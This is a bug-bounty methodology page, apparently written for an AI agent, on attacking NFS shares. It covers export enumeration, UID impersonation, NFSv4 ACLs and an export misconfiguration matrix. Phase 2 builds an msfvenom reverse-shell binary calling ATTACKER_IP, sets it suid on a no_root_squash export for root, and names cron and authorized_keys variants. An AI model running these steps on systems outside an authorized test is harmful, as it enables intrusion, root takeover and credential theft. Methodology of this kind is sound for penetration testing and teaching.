---
technology: "NFS"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "corpus-grounded (13 writeups: 3 UID-GID impersonation; 3 source disclosure; 2 Windows NFS vers=3; 2 pivoted showmount; 3 rpcbind context) + upstream-verified (exports(5) — root_squash default, anonymous 65534, all_squash/anonuid/anongid, sec= flavors, insecure, subtree_check; RFC 7530 ACL model). Companion overview: [[nfs|NFS]]. Enrichment pass 1, 2026-11-12."
---

# NFS bug bounty methodology

Target model: rpcbind on 111 + nfs/mountd on 2049 (v2/v3, often UDP-capable) or a single
2049/tcp listener (v4). AUTH_SYS identity unless sec=krb5* is negotiated. Authorization
assumed; all steps below are read-only or land on targets you own.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Export enumeration | showmount answers | yes | Full share map — recon |
| UID/GID impersonation | rw export, target uid known, squashing not all_squash | mount only | Read/write as any non-squashed uid — High |
| no_root_squash RCE | rw export + no_root_squash | mount only | Root code exec via suid shell — Critical |
| Source/credential disclosure | ro export with app data | mount only | Source, keys, hashes — High |
| NFSv4 ACL abuse | v4 export, ACL richer than mode bits | mount only | Access the mode bits claim to deny — Medium |
| Filehandle guessing / subtree_check | subdirectory exports | yes | Files outside the intended subtree — Medium |

## Phase 0 — Enumerate exports

```bash
rpcinfo -p 198.51.100.10                 # rpcbind map: mountd/nfsd/nlockmgr programs+ports
showmount -e 198.51.100.10               # export table, pre-auth
sudo nmap -sV --script nfs-showmount,nfs-ls -p 111,2049 198.51.100.10
```

Observed pattern: pivot first, enumerate second — one chain reached a 192.168.100.0/24-only
export through a ligolo-ng pivot; another enumerated the internal NFS gateway at the
internal IP. The export's client list tells you which position in the network you need.

## Phase 1 — Mount and map identity trust

```bash
sudo mount -t nfs -o rw,vers=3 198.51.100.10:/srv/share /mnt/nfs -o nolock
ls -ln /mnt/nfs                          # owner UIDs/GIDs in numeric form — the identity map
cat /etc/exports                         # from any shell/read primitive on the server side
```

`ls -ln` is the key output: it lists exactly which UIDs own what. Under default
root_squash+no_all_squash, every non-zero UID is trusted raw. To become user 2017
(the canonical observed chain):

```bash
sudo useradd -u 2017 nfsuser             # local account with the target UID
sudo -u nfsuser cat /mnt/nfs/secret      # server sees uid 2017 = its web owner
```

Observed outcomes: web-root UID 2017 takeover → shell as web user; UID
trust across a home directory → user foothold; UID/GID confusion to escalate
inside a pivoted segment. Windows variant: the same idea with `vers=3` from a Linux
client against an unauthenticated Windows export; credential files on the share cracked
offline with John.

## Phase 2 — no_root_squash RCE chain

When the export is rw *and* root is not squashed (exports(5): "no_root_squash — Turn off
root squashing"), the mounting root *is* server root on that filesystem:

```bash
# 1. from the mounted export, drop a suid-root binary owned by root:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o /mnt/nfs/sh
chmod 4777 /mnt/nfs/sh                  # suid bit survives onto the server fs
# 2. from any unprivileged shell on the server (www-data via the web app, etc.):
/mnt/nfs/path/sh                         # euid 0 → root shell
```

Variants: overwrite a root-cron'd script or drop `~/.ssh/authorized_keys` for a root
login path — anything a root-owned writable directory enables. This is the classic chain
the misconfiguration matrix below predicts; observed boxes lean on the UID variant more
often, but check every rw export for the no_root_squash flag specifically.

## Phase 3 — NFSv4 differences that matter

- **Single port, stateful protocol**: no rpcbind walk; 2049/tcp only. Absence of mountd in
  rpcinfo does not mean no NFS — it may be v4.
- **ACLs instead of mode bits**: RFC 7530 `acl` attribute is a Windows-model list of
  ALLOW/DENY ACEs (modeled on SMB ACL semantics, per the NFSv4 security drafts), evaluated
  first-match-wins per access bit — a file can deny its owner and allow a group, or carry
  ALLOW/DENY pairs that emulate POSIX. Read them with nfs4xdr_getfacl-style tooling
  (getfacl on nfs4 mounts) rather than assuming `ls` mode bits are the whole story.
- **sec= negotiation**: exports can require krb5 (auth), krb5i (+integrity), krb5p
  (+privacy). AUTH_SYS (`sys`, the default per exports(5)) is "no cryptographic
  security" — the UID trust above. If the mount fails with permission denied on a v4
  export, suspect sec=krb5*, and pivot to attacking the KDC path ([[kerberos]]) instead.
- **No MOUNT protocol**: enumeration of exports differs — v4 uses a pseudo-root
  (`/`); try listing `/` and walking down, since showmount may show nothing.

## Phase 4 — Export misconfiguration matrix

| Export line | Identity effect | Attack |
|---|---|---|
| `*(rw)` default squash | root→65534, others raw | UID impersonation (Phase 1) |
| `*(rw,no_root_squash)` | root arrives as root | suid/cron/authorized_keys RCE (Phase 2) |
| `*(rw,all_squash,anonuid=N)` | everyone→uid N | Only as strong as uid N's reach |
| `*(rw,insecure)` | clients from ports >1024 allowed | Any host, no reserved-port requirement |
| subdirectory export w/ subtree_check | fs boundary guessing | Filehandle probing outside the subtree |
| `*(ro)` with sensitive data | read as squashed uid | Source/credential disclosure (field-observed) |
| `sec=krb5p` only | crypto-authenticated | Off this page; attack the ticket path |

Reading the matrix: the first column is exactly what `/etc/exports` says on the host (any
file-read primitive); the second is what the server *does* to your claimed uid; the third
is the play it unlocks.

## Command quick reference

```bash
showmount -e HOST && rpcinfo -p HOST
mount -t nfs -o rw,vers=3,nolock HOST:/export /mnt/nfs
ls -ln /mnt/nfs                       # numeric uid/gid map
umount /mnt/nfs
```

## Tool mapping (prose)

showmount and rpcinfo for export discovery; mount.nfs with vers/nolock options for the
mount; nmap nfs-showmount/nfs-ls scripts for scripted sweeps; msfvenom for the suid
payload; John the Ripper for credential files lifted from shares (field-observed);
ligolo-ng or chisel for reaching internal-only exports (field-observed). Tools vault owns
per-tool pages.
